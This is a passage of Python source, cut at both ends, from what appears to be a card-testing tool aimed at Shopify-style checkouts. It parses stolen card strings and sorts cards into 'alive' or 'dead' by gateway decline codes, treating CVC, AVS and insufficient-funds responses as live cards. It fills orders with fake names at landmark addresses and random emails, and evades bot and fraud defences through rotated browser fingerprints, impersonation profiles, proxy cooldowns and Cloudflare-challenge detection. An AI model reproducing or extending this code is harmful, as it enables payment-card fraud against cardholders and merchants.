    "DNSError",
    "ProxyError",
    "CurlError",
    "Curl:",
    "FAILED_TO_PERFORM",
    "FAILED_TO_CONNECT",
    "CONNECTION_RESET",
    "OPERATION_TIMEDOUT",
)

def eyelifter_classify_probe(r):
    verdict = r.get("verdict", "ERROR")
    code = (r.get("code") or "").upper().replace(" ", "_")

    if code == "OUT_OF_RANGE":
        return "error", "Out of price range", "Unknown"

    if code == "CAPTCHA_REQUIRED":
        gw = (r.get("gateway") or "").strip() or "Unknown"
        return "alive", "Alive (Captcha gate — final)", gw

    if code.endswith("_REQUIRED") and "CAPTCHA" in code:
        return "dead", f"Dead (Mid-step captcha: {code})", "Unknown"

    gw = (r.get("gateway") or "").strip() or "Unknown"

    if verdict == "COMPLETED":
        return "alive", "Alive (Charged)", gw

    if verdict == "3DS":
        return "alive", "Alive (3DS)", gw

    if verdict == "DECLINED":
        return "alive", f"Alive (Declined {code})", gw

    if verdict == "DEAD_CARD":
        return "alive", f"Alive (Card rejected {code})", gw

    if verdict in ("Approved (Insufficient Funds)", "Approved (CVC)", "Approved (AVS)"):
        return "alive", f"Alive ({verdict})", gw

    if verdict == "CAPTCHA_PROPOSAL":
        return "dead", f"Dead (Proposal captcha: {code})", "Unknown"

    if verdict == "RISK_BLOCKED":
        return "dead", f"Dead (Risk gate: {code})", "Unknown"

    if verdict == "LOGIN_REQUIRED":
        return "dead", "Dead (Login required)", "Unknown"

    gw = (r.get("gateway") or "").strip() or "Unknown"

    if code in (
        "FRAUD_SUSPECTED",
        "RISK_REJECTED",
        "RISK_BLOCKED",
        "RISKY",
        "FRAUD_BLOCK",
    ):
        return "alive", f"Alive (Risk gate: {code})", gw

    if verdict == "TIMEOUT" or code == "TIMEOUT":
        return "error", f"Timeout ({code or 'unknown'})", "Unknown"

    if verdict == "FAILED":
        if code in eyelifter_RETRY_CODES or any(x in code for x in eyelifter_RETRY_CODES):
            return "error", f"Retryable ({code})", "Unknown"
        if code in eyelifter_DEAD_CODES or any(x in code for x in eyelifter_DEAD_CODES):
            return "dead", f"Dead ({code})", "Unknown"
        return "error", f"Failed ({code or 'unknown'})", "Unknown"

    if verdict == "ERROR":
        if any(x in code for x in eyelifter_TRANSPORT_ERRORS):
            return "error", f"Transport ({code[:40]})", "Unknown"
        if any(x in code for x in eyelifter_INTERNAL_DEAD):
            return "dead", f"Dead ({code})", "Unknown"
        return "error", f"Error ({code or 'unknown'})", "Unknown"

    return "error", f"Unknown ({verdict})", "Unknown"


eyelifter_TERMINAL = {
    "ProcessedReceipt": "COMPLETED",
    "CompletedReceipt": "COMPLETED",
    "FinalizedReceipt": "COMPLETED",
    "FailedReceipt": "FAILED",
    "ActionRequiredReceipt": "ACTION_REQUIRED",
    "CancelledReceipt": "CANCELLED",
    "ExpiredReceipt": "EXPIRED",
}

eyelifter_DEAD_CARD_CODES = {
    "INCORRECT_NUMBER",
    "INVALID_NUMBER",
    "INVALID_CARD",
    "NUMBER_IS_NOT_A_CREDIT_CARD",
    "NUMBER_INVALID",
}

eyelifter_DECLINE_CODES = {
    "CARD_DECLINED",
    "DO_NOT_HONOR",
    "GENERIC_ERROR",
    "PROCESSING_ERROR",
    "CARD_EXPIRED",
    "EXPIRED_CARD",
    "CARD_STOLEN",
    "LOST_CARD",
    "PICKUP_CARD",
    "PICK_UP_CARD",
    "CARD_VELOCITY_EXCEEDED",
    "CALL_ISSUER",
    "RESTRICTED_CARD",
    "BANK_DECLINE",
    "ISSUER_DECLINE",
}

eyelifter_LIVE_CODES = {
    "INSUFFICIENT_FUNDS": "Approved (Insufficient Funds)",
    "INSUFFICIENT_BALANCE": "Approved (Insufficient Funds)",
    "NOT_ENOUGH_FUNDS": "Approved (Insufficient Funds)",
    "BALANCE_INSUFFICIENT": "Approved (Insufficient Funds)",
    "INCORRECT_CVC": "Approved (CVC)",
    "INCORRECT_CVV": "Approved (CVC)",
    "CVV_INVALID": "Approved (CVC)",
    "CVV_FAILURE": "Approved (CVC)",
    "CVC_FAILURE": "Approved (CVC)",
    "INVALID_CVV": "Approved (CVC)",
    "INVALID_CVC": "Approved (CVC)",
    "CVC_MISMATCH": "Approved (CVC)",
    "CVV_MISMATCH": "Approved (CVC)",
    "AVS_FAILURE": "Approved (AVS)",
    "MISMATCHED_BILL": "Approved (AVS)",
    "AVS_MISMATCH": "Approved (AVS)",
    "INCORRECT_ZIP": "Approved (AVS)",
    "INCORRECT_ADDRESS": "Approved (AVS)",
    "AUTHENTICATION_REQUIRED": "3DS",
    "PENDING_3DS": "3DS",
    "3DS_REDIRECT": "3DS",
    "OTP_REQUIRED": "3DS",
}

eyelifter_ADDRS = {
    "US": [
        {"address1": "123 Lundquist Dr", "address2": "", "city": "Braintree", "zone": "MA", "zip": "02184", "country": "US", "phone": "+17815550100", "lat": 42.20349884033203, "lng": -71.02549743652344, "first": "Leni", "last": "Mast"},
        {"address1": "1600 Amphitheatre Pkwy", "address2": "", "city": "Mountain View", "zone": "CA", "zip": "94043", "country": "US", "phone": "+16502530000", "lat": 37.4220, "lng": -122.0841, "first": "John", "last": "Doe"},
        {"address1": "350 Fifth Ave", "address2": "Suite 100", "city": "New York", "zone": "NY", "zip": "10118", "country": "US", "phone": "+12127363100", "lat": 40.7484, "lng": -73.9857, "first": "Jane", "last": "Smith"},
        {"address1": "233 S Wacker Dr", "address2": "Suite 3530", "city": "Chicago", "zone": "IL", "zip": "60606", "country": "US", "phone": "+13125550100", "lat": 41.8789, "lng": -87.6359, "first": "Michael", "last": "Rodriguez"},
        {"address1": "1600 Pennsylvania Ave NW", "address2": "", "city": "Washington", "zone": "DC", "zip": "20500", "country": "US", "phone": "+12024561111", "lat": 38.8977, "lng": -77.0365, "first": "David", "last": "Thompson"},
        {"address1": "1 Microsoft Way", "address2": "", "city": "Redmond", "zone": "WA", "zip": "98052", "country": "US", "phone": "+14258828080", "lat": 47.6396, "lng": -122.1285, "first": "Christopher", "last": "Lee"},
        {"address1": "1 Infinite Loop", "address2": "", "city": "Cupertino", "zone": "CA", "zip": "95014", "country": "US", "phone": "+14089961010", "lat": 37.3318, "lng": -122.0312, "first": "Sarah", "last": "Anderson"},
        {"address1": "6700 Hollywood Blvd", "address2": "", "city": "Los Angeles", "zone": "CA", "zip": "90028", "country": "US", "phone": "+13234650100", "lat": 34.1016, "lng": -118.3287, "first": "Daniel", "last": "Garcia"},
        {"address1": "6000 Universal Blvd", "address2": "", "city": "Orlando", "zone": "FL", "zip": "32819", "country": "US", "phone": "+14073638000", "lat": 28.4753, "lng": -81.4680, "first": "Jessica", "last": "Williams"},
        {"address1": "401 Biscayne Blvd", "address2": "", "city": "Miami", "zone": "FL", "zip": "33132", "country": "US", "phone": "+13053588300", "lat": 25.7785, "lng": -80.1868, "first": "Carlos", "last": "Martinez"},
        {"address1": "2000 Commerce St", "address2": "Suite 400", "city": "Dallas", "zone": "TX", "zip": "75201", "country": "US", "phone": "+12147452000", "lat": 32.7861, "lng": -96.7967, "first": "Robert", "last": "Johnson"},
        {"address1": "1000 Broadway", "address2": "Suite 300", "city": "Nashville", "zone": "TN", "zip": "37203", "country": "US", "phone": "+16152555000", "lat": 36.1614, "lng": -86.7824, "first": "Amanda", "last": "Wilson"},
        {"address1": "1201 Market St", "address2": "", "city": "Philadelphia", "zone": "PA", "zip": "19107", "country": "US", "phone": "+12155557000", "lat": 39.9526, "lng": -75.1588, "first": "William", "last": "Brown"},
        {"address1": "500 Terry A Francois Blvd", "address2": "", "city": "San Francisco", "zone": "CA", "zip": "94158", "country": "US", "phone": "+14155556000", "lat": 37.7699, "lng": -122.3877, "first": "Emily", "last": "Davis"},
        {"address1": "1 Hacker Way", "address2": "", "city": "Menlo Park", "zone": "CA", "zip": "94025", "country": "US", "phone": "+16505434800", "lat": 37.4848, "lng": -122.1484, "first": "Kevin", "last": "Miller"},
        {"address1": "3999 Mission Blvd", "address2": "", "city": "San Diego", "zone": "CA", "zip": "92109", "country": "US", "phone": "+18584881000", "lat": 32.7900, "lng": -117.2523, "first": "Nicole", "last": "Taylor"},
        {"address1": "700 16th St", "address2": "Suite 200", "city": "Denver", "zone": "CO", "zip": "80202", "country": "US", "phone": "+13036201000", "lat": 39.7442, "lng": -104.9994, "first": "Matthew", "last": "Anderson"},
        {"address1": "301 Congress Ave", "address2": "Suite 500", "city": "Austin", "zone": "TX", "zip": "78701", "country": "US", "phone": "+15124741000", "lat": 30.2648, "lng": -97.7423, "first": "Ashley", "last": "Moore"},
        {"address1": "1201 3rd Ave", "address2": "Suite 1000", "city": "Seattle", "zone": "WA", "zip": "98101", "country": "US", "phone": "+12066821000", "lat": 47.6072, "lng": -122.3362, "first": "Ryan", "last": "Jackson"},
        {"address1": "1 Boston Pl", "address2": "Suite 2600", "city": "Boston", "zone": "MA", "zip": "02108", "country": "US", "phone": "+16175550100", "lat": 42.3587, "lng": -71.0552, "first": "Lauren", "last": "White"},
    ],
    "GB": [
        {"address1": "10 Downing St", "address2": "", "city": "London", "zone": "ENG", "zip": "SW1A 2AA", "country": "GB", "phone": "+442012345678", "lat": 51.5034, "lng": -0.1276, "first": "James", "last": "Wilson"},
        {"address1": "221B Baker Street", "address2": "", "city": "London", "zone": "ENG", "zip": "NW1 6XE", "country": "GB", "phone": "+442072242218", "lat": 51.5237, "lng": -0.1585, "first": "Sherlock", "last": "Holmes"},
    ],
    "CA": [
        {"address1": "200 Kent St", "address2": "", "city": "Ottawa", "zone": "ON", "zip": "K1A 0G9", "country": "CA", "phone": "+16135550100", "lat": 45.4215, "lng": -75.6972, "first": "John", "last": "Smith"},
        {"address1": "1 King St W", "address2": "", "city": "Toronto", "zone": "ON", "zip": "M5H 1A1", "country": "CA", "phone": "+14163673620", "lat": 43.6487, "lng": -79.3784, "first": "David", "last": "Brown"},
    ],
    "AU": [
        {"address1": "1 George St", "address2": "", "city": "Sydney", "zone": "NSW", "zip": "2000", "country": "AU", "phone": "+61212345678", "lat": -33.8688, "lng": 151.2093, "first": "Thomas", "last": "Taylor"},
        {"address1": "100 St Kilda Rd", "address2": "", "city": "Melbourne", "zone": "VIC", "zip": "3004", "country": "AU", "phone": "+61392837000", "lat": -37.8206, "lng": 144.9689, "first": "Jack", "last": "Davis"},
    ],
    "DE": [
        {"address1": "Friedrichstr 100", "address2": "", "city": "Berlin", "zone": "BE", "zip": "10117", "country": "DE", "phone": "+493012345678", "lat": 52.5200, "lng": 13.4050, "first": "Lucas", "last": "Thomas"},
        {"address1": "Marienplatz 1", "address2": "", "city": "Munich", "zone": "BY", "zip": "80331", "country": "DE", "phone": "+498923456789", "lat": 48.1372, "lng": 11.5756, "first": "Max", "last": "Mustermann"},
    ],
    "FR": [
        {"address1": "10 Rue de Rivoli", "address2": "", "city": "Paris", "zone": "IDF", "zip": "75001", "country": "FR", "phone": "+33112345678", "lat": 48.8566, "lng": 2.3522, "first": "Hugo", "last": "Bernard"},
        {"address1": "5 Avenue Anatole France", "address2": "", "city": "Paris", "zone": "IDF", "zip": "75007", "country": "FR", "phone": "+33144112233", "lat": 48.8584, "lng": 2.2945, "first": "Louis", "last": "Petit"},
    ],
    "NL": [
        {"address1": "Dam 1", "address2": "", "city": "Amsterdam", "zone": "NH", "zip": "1012 JS", "country": "NL", "phone": "+31201234567", "lat": 52.3730, "lng": 4.8926, "first": "Bas", "last": "Jansen"},
        {"address1": "Coolsingel 40", "address2": "", "city": "Rotterdam", "zone": "ZH", "zip": "3011 AD", "country": "NL", "phone": "+31101234567", "lat": 51.9225, "lng": 4.4791, "first": "Daan", "last": "De Vries"},
    ],
    "IN": [
        {"address1": "12 MG Road Indiranagar", "address2": "", "city": "Bangalore", "zone": "KA", "zip": "560001", "country": "IN", "phone": "+919845012345", "lat": 12.9716, "lng": 77.5946, "first": "Arjun", "last": "Reddy"},
        {"address1": "Gateway of India", "address2": "", "city": "Mumbai", "zone": "MH", "zip": "400001", "country": "IN", "phone": "+912222012345", "lat": 18.9220, "lng": 72.8347, "first": "Rahul", "last": "Sharma"},
    ],
    "JP": [
        {"address1": "1-1-1 Marunouchi", "address2": "", "city": "Tokyo", "zone": "13", "zip": "100-0005", "country": "JP", "phone": "+81312345678", "lat": 35.6812, "lng": 139.7671, "first": "Takashi", "last": "Yamamoto"},
        {"address1": "2-1-1 Nakanoshima", "address2": "", "city": "Osaka", "zone": "27", "zip": "530-0005", "country": "JP", "phone": "+81612345678", "lat": 34.6937, "lng": 135.4926, "first": "Kenji", "last": "Sato"},
    ],
    "BR": [
        {"address1": "Av Paulista 1000", "address2": "", "city": "Sao Paulo", "zone": "SP", "zip": "01310-100", "country": "BR", "phone": "+5511987654321", "lat": -23.5505, "lng": -46.6333, "first": "Carlos", "last": "Silva"},
        {"address1": "Av Atlantica 1702", "address2": "", "city": "Rio de Janeiro", "zone": "RJ", "zip": "22021-001", "country": "BR", "phone": "+5521987654321", "lat": -22.9711, "lng": -43.1822, "first": "Joao", "last": "Pereira"},
    ],
    "MX": [
        {"address1": "Av Reforma 100", "address2": "", "city": "Mexico City", "zone": "CMX", "zip": "06000", "country": "MX", "phone": "+525512345678", "lat": 19.4326, "lng": -99.1332, "first": "Diego", "last": "Hernandez"},
        {"address1": "Av Juarez 50", "address2": "", "city": "Guadalajara", "zone": "JAL", "zip": "44100", "country": "MX", "phone": "+523312345678", "lat": 20.6767, "lng": -103.3475, "first": "Luis", "last": "Garcia"},
    ],
    "ES": [
        {"address1": "Calle Mayor 1", "address2": "", "city": "Madrid", "zone": "M", "zip": "28013", "country": "ES", "phone": "+34912345678", "lat": 40.4168, "lng": -3.7038, "first": "Carlos", "last": "Garcia"},
        {"address1": "Passeig de Gracia 1", "address2": "", "city": "Barcelona", "zone": "CT", "zip": "08007", "country": "ES", "phone": "+34932134567", "lat": 41.3874, "lng": 2.1686, "first": "Javier", "last": "Lopez"},
    ],
    "IT": [
        {"address1": "Via Roma 1", "address2": "", "city": "Rome", "zone": "RM", "zip": "00184", "country": "IT", "phone": "+39061234567", "lat": 41.9028, "lng": 12.4964, "first": "Marco", "last": "Rossi"},
        {"address1": "Piazza del Duomo 1", "address2": "", "city": "Milan", "zone": "MI", "zip": "20121", "country": "IT", "phone": "+39021234567", "lat": 45.4642, "lng": 9.1900, "first": "Alessandro", "last": "Bianchi"},
    ],
}

eyelifter_ADDR_FALLBACK = [
    "US", "GB", "CA", "AU", "DE", "FR", "NL", "IN", "JP", "BR", "MX", "ES", "IT"
]

eyelifter_LOCALE_FALLBACK = ["en-us", "en-gb", "en-ca", "en-au", "en-in", ""]

eyelifter_BAD_TLDS = frozenset((
    "txt", "pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "md",
    "rtf", "html", "htm", "xml", "xhtml", "css", "js", "php", "asp",
    "aspx", "jsp", "png", "jpg", "jpeg", "gif", "svg", "ico", "webp",
    "bmp", "tif", "tiff", "mp3", "mp4", "wav", "avi", "mov", "mkv",
    "flv", "webm", "zip", "tar", "gz", "rar", "7z", "bz2", "json",
    "csv", "yaml", "yml", "toml", "ini", "conf", "log", "env",
    "py", "sh", "bat", "exe", "dll", "bin", "iso", "apk",
))

eyelifter_DOMAIN_TOKEN_RX = re.compile(
    r'(?:https?://)?'
    r'(?:www\.)?'
    r'(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+'
    r'[a-z]{2,24}'
    r'(?::\d{1,5})?'
    r'(?:/[^\s"\'<>\[\]{},]*)?',
    re.IGNORECASE,
)

eyelifter_HOST_LABEL_RX = re.compile(
    r'^[a-z0-9](?:[a-z0-9-]*[a-z0-9])?$'
)


def eyelifter_extract_domain_tokens(text):
    if not isinstance(text, str):
        return []
    text = text.replace("\xa0", " ")
    seen = set()
    out = []
    for m in eyelifter_DOMAIN_TOKEN_RX.finditer(text):
        tok = m.group(0)
        if "://" in tok:
            tok = tok.split("://", 1)[1]
        host = re.split(r"[/?#]", tok, maxsplit=1)[0]
        if "@" in host:
            host = host.rsplit("@", 1)[1]
        if ":" in host:
            host = host.split(":", 1)[0]
        host = host.strip().strip(".").lower()
        if host.startswith("www."):
            host = host[4:]
        if not host or "." not in host:
            continue
        parts = host.split(".")
        if len(parts) < 2:
            continue
        tld = parts[-1]
        if tld in eyelifter_BAD_TLDS:
            continue
        if len(host) < 4 or len(host) > 253:
            continue
        if not all(p and len(p) <= 63 and eyelifter_HOST_LABEL_RX.match(p) for p in parts):
            continue
        if host in seen:
            continue
        seen.add(host)
        out.append(host)
    return out

eyelifter_UA_POOL = (
    ("chrome131", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"),
    ("chrome131", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"),
    ("chrome131", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"),
    ("chrome131", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0"),
    ("chrome130", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"),
    ("chrome130", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"),
    ("chrome130", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"),
    ("chrome129", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"),
    ("chrome129", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"),
    ("chrome128", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"),
    ("chrome128", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"),
    ("chrome127", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"),
    ("chrome127", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"),
    ("chrome126", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"),
    ("chrome126", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"),
    ("chrome124", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"),
    ("chrome124", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"),
    ("chrome124", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"),
    ("chrome123", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"),
    ("chrome123", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"),
    ("chrome120", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
    ("chrome120", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
    ("chrome120", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
    ("firefox133", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0"),
    ("firefox133", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0"),
    ("firefox133", "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0"),
    ("safari17_0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"),
    ("safari17_0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"),
    ("safari18_0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15"),
)

eyelifter_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
)

eyelifter_VALID_TARGETS = None


def eyelifter_supported_targets():
    global eyelifter_VALID_TARGETS
    if eyelifter_VALID_TARGETS is None:
        try:
            from curl_cffi.requests.impersonate import BrowserType
            eyelifter_VALID_TARGETS = {str(getattr(v, "value", v)) for v in BrowserType}
        except Exception:
            eyelifter_VALID_TARGETS = set()
    return eyelifter_VALID_TARGETS


def eyelifter_pick_profile():
    valid = eyelifter_supported_targets()
    if valid:
        pool = [p for p in eyelifter_UA_POOL if p[0] in valid]
        if pool:
            return random.choice(pool)
        eyelifter_dbg("UA", "no pool entries match installed curl_cffi — falling back")
    return random.choice(eyelifter_UA_POOL)


def eyelifter_fp_from_ua(ua):
    ua_low = ua.lower()
    if "windows" in ua_low:
        platform = '"Windows"'
    elif "macintosh" in ua_low or "mac os" in ua_low:
        platform = '"macOS"'
    elif "android" in ua_low:
        platform = '"Android"'
    elif "linux" in ua_low:
        platform = '"Linux"'
    else:
        platform = '"Windows"'
    mobile = "?1" if ("mobile" in ua_low or "android" in ua_low) else "?0"
    is_firefox = "firefox" in ua_low
    is_safari = "safari" in ua_low and "chrome" not in ua_low
    if is_firefox or is_safari:
        return None, mobile, platform
    m = re.search(r"Chrome/(\d+)", ua)
    ver = m.group(1) if m else "131"
    return f'"Chromium";v="{ver}", "Not;A=Brand";v="99"', mobile, platform


eyelifter_BAD_MARKERS = (
    "just a moment",
    "cf-chl-bypass",
    "cf-challenge",
    "attention required",
    "checking your browser",
    "access denied",
    "enable javascript",
    "please enable cookies",
    "your request has been blocked",
    "forbidden",
    "rate limit",
    "too many requests",
)


def eyelifter_ra(n, chars=None):
    if chars is None:
        chars = string.ascii_letters + string.digits
    return "".join(random.choices(chars, k=n))


def eyelifter_mixed_uuid():
    u = str(uuid.uuid4()).split("-")
    return f"{u[0]}-{u[1]}-{u[2]}-{u[3].upper()}-{u[4].upper()}"


def eyelifter_is_bad_response(status, text):
    if not text or not text.strip():
        return True
    if status in (403, 429, 503):
        return True
    head = text[:400].lstrip().lower()
    if head.startswith(("<", "<!doctype", "<?xml")):
        return True
    if any(m in head for m in eyelifter_BAD_MARKERS):
        return True
    try:
        json.loads(text)
        return False
    except Exception:
        return True
class eyelifter_Stopped(Exception):
    pass


class eyelifter_Client:
    def __init__(self, timeout=None, proxy=None, profile=None, ua=None):
        if profile is None or ua is None:
            profile, ua = eyelifter_pick_profile()
        self.profile = profile
        self.ua = ua
        self.proxy = proxy or ""
        self._cffi_active = False
        to = timeout or eyelifter_CFG.s.get("timeout", 25)
        self.last_response = None

        if eyelifter_HAVE_CFFI:
            for attempt in (profile, "chrome"):
                try:
                    self.session = Session(timeout=to, impersonate=attempt)
                    self.profile = attempt
                    self._cffi_active = True
                    break
                except Exception:
                    continue
            else:
                self.session = Session(timeout=to)
                self.profile = "plain"
            if self.proxy:
                try:
                    self.session.proxies = {
                        "http": self.proxy,
                        "https": self.proxy,
                    }
                except Exception:
                    pass
        else:
            self.session = Session()
            if self.proxy:
                self.session.proxies.update({
                    "http": self.proxy,
                    "https": self.proxy,
                })

        try:
            self.session.verify = False
        except Exception:
            pass

        base = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Cache-Control": "max-age=0",
        }
        if not self._cffi_active:
            base["User-Agent"] = ua
            ch, mob, plat = eyelifter_fp_from_ua(ua)
            if ch:
                base["sec-ch-ua"] = ch
                base["sec-ch-ua-mobile"] = mob
                base["sec-ch-ua-platform"] = plat
        self.session.headers.update(base)

    def eyelifter_gql_post(self, url, body, headers, timeout=None):
        if eyelifter_STOP.is_set():
            raise eyelifter_Stopped()
        to = timeout if timeout is not None else eyelifter_CFG.s.get("timeout", 25)
        last = None
        for attempt in range(3):
            try:
                r = self.session.post(
                    url,
                    json=body,
                    headers=headers,
                    timeout=to,
                    verify=False
                )
            except Exception:
                if attempt == 2:
                    raise
                time.sleep(0.4 + attempt * 0.3 + random.uniform(0, 0.2))
                continue
            last = r
            self.last_response = r

            if r.status_code == 403:
                return r

            if r.status_code == 429:
                if self.proxy:
                    eyelifter_cool_proxy(self.proxy, 90)
                if attempt < 2:
                    time.sleep(2.0 + attempt * 2.0 + random.uniform(0, 1.0))
                    continue
                return r

            try:
                text = r.text or ""
            except Exception:
                text = ""
            if eyelifter_is_bad_response(r.status_code, text):
                if attempt < 2:
                    time.sleep(0.4 + attempt * 0.3 + random.uniform(0, 0.2))
                    continue
            return r
        return last

    def eyelifter_get(self, url, **kw):
        if eyelifter_STOP.is_set():
            raise eyelifter_Stopped()
        kw.setdefault("timeout", eyelifter_CFG.s.get("timeout", 25))
        kw.setdefault("verify", False)
        r = self.session.get(url, **kw)
        self.last_response = r
        return r

    def eyelifter_post(self, url, data=None, json=None, **kw):
        if eyelifter_STOP.is_set():
            raise eyelifter_Stopped()
        kw.setdefault("timeout", eyelifter_CFG.s.get("timeout", 25))
        kw.setdefault("verify", False)
        r = self.session.post(url, data=data, json=json, **kw)
        self.last_response = r
        return r

    def eyelifter_close(self):
        try:
            self.session.close()
        except Exception:
            pass


def eyelifter_parse_card(raw):
    if not isinstance(raw, str):
        raise ValueError("card input must be string")
    text = raw.strip()
    if not text:
        raise ValueError("empty card")

    m = eyelifter_CARD_RE.search(text)
    if not m:
        raise ValueError("no card pattern found")

    number = m.group(1)
    month = int(m.group(2))
    year_raw = int(m.group(3))
    cvv = m.group(4)

    if not (1 <= month <= 12):
        raise ValueError(f"invalid month {month}")

    year = year_raw
    if year < 100:
        year += 2000
    elif year < 1000:
        raise ValueError(f"invalid year {year_raw}")

    return {
        "number": number,
        "month":  month,
        "year":   year,
        "cvv":    cvv,
        "name":   "",
        "raw":    f"{number}|{month:02d}|{year}|{cvv}",
    }

def eyelifter_random_email():
    first = random.choice([
        "james", "john", "robert", "michael", "david",
        "mary", "patricia", "jennifer", "linda", "elizabeth",
    ])
    last = random.choice([
        "smith", "johnson", "williams", "brown", "jones",
        "garcia", "miller", "davis",
    ])
    return (
        f"{first}{last}{random.randint(1, 999)}@"
        f"{random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com'])}"
    )


def eyelifter_addr_json(addr, partial=False):
    base = {
        "address1":    addr["address1"],
        "address2":    addr.get("address2", ""),
        "city":        addr["city"],
        "countryCode": addr["country"],
        "postalCode":  addr["zip"],
        "firstName":   addr["first"],
        "lastName":    addr["last"],
        "zoneCode":    addr["zone"],
        "phone":       addr["phone"],
        "oneTimeUse":  False,
    }
    if not partial and addr.get("lat") and addr.get("lng"):
        base["coordinates"] = {
            "latitude": addr["lat"],
            "longitude": addr["lng"],
        }
    return base


def eyelifter_dig(obj, *keys):
    for k in keys:
        if not isinstance(obj, dict):
            return None
        obj = obj.get(k)
        if obj is None:
            return None
    return obj


def eyelifter_scrape_page_id(h):
    u = html.unescape(h)
    for pat in [
        r'"pageId"\s*:\s*"([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})"',
        r'"pageUuid"\s*:\s*"([0-9a-fA-F\-]{20,})"',
    ]:
        m = re.search(pat, u)
        if m:
            return m.group(1)
    return None


def eyelifter_scrape_build_id(h, headers):
    if headers:
        for hname in (
            "x-checkout-web-build-id",
            "X-Checkout-Web-Build-Id",
            "x-shopify-checkout-web-build-id",
            "x-shopify-web-build-id",
        ):
            for k, v in headers.items():
                if k.lower() == hname.lower():
                    m = re.search(r"[a-f0-9]{20,}", str(v))
                    if m:
                        return m.group(0)
    u = html.unescape(h)
    for pat in [
        r'"commitSha"\s*:\s*"([a-f0-9]{40})"',
        r'"buildId"\s*:\s*"([a-f0-9]{20,})"',
        r'\\"buildId\\"\s*:\s*\\"([a-f0-9]{20,})\\"',
    ]:
        m = re.search(pat, u)
        if m:
            h2 = re.search(r"[a-f0-9]{20,}", m.group(1))
            if h2:
                return h2.group(0)
    return ""


def eyelifter_scrape_source_token(h):
    m = re.search(
